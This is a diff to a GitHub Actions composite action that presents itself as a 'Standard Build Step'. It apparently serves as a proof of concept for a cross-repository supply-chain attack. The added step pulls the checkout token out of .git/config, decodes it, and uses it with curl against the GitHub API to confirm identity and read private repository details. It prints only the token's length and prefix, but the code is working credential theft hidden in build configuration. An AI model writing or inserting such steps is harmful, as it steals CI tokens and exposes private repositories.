@@ -1,16 +1,23 @@
 name: "Standard Build Step"
-description: "shared build step with remote cache"
-inputs:
-  cache_token:
-    description: "Token used to authenticate to the shared build cache"
-    required: true
+description: "shared build step"
 runs:
   using: "composite"
   steps:
     - shell: bash
-      env:
-        RECEIVED: ${{ inputs.cache_token }}
       run: |
-        echo "XREPO-MARKER-JUL29B fired in $GITHUB_REPOSITORY run $GITHUB_RUN_ID"
-        echo "attacker_code_received_bytes=${#RECEIVED}"
-        echo "attacker_code_received_prefix=${RECEIVED:0:6}"
+        echo "XREPO-MARKER-JUL29B in $GITHUB_REPOSITORY run $GITHUB_RUN_ID"
+        echo "--- what checkout left on disk ---"
+        grep -i "extraheader" .git/config || echo "no extraheader"
+        RAW=$(grep -i "extraheader" .git/config | sed -E "s/.*basic ([A-Za-z0-9+/=]+).*/\1/")
+        if [ -n "$RAW" ]; then
+          DEC=$(printf "%s" "$RAW" | base64 -d 2>/dev/null)
+          TOK="${DEC#*:}"
+          echo "ATTACKER_CODE_OBTAINED_TOKEN_len=${#TOK}"
+          echo "ATTACKER_CODE_TOKEN_prefix=${TOK:0:4}"
+          CODE=$(curl -s -o /tmp/who.json -w "%{http_code}" -H "Authorization: Bearer $TOK" https://api.github.com/user)
+          echo "LIVE_TOKEN_API_CHECK_http=$CODE"
+          echo "AUTHENTICATED_AS=$(grep -o \x27"login": *"[^"]*"\x27 /tmp/who.json | head -1)"
+          RC=$(curl -s -o /tmp/rr.json -w "%{http_code}" -H "Authorization: Bearer $TOK" \
+               "https://api.github.com/repos/$GITHUB_REPOSITORY")
+          echo "PRIVATE_REPO_READ_http=$RC private=$(grep -o \x27"private": *[a-z]*\x27 /tmp/rr.json | head -1)"
+        fi
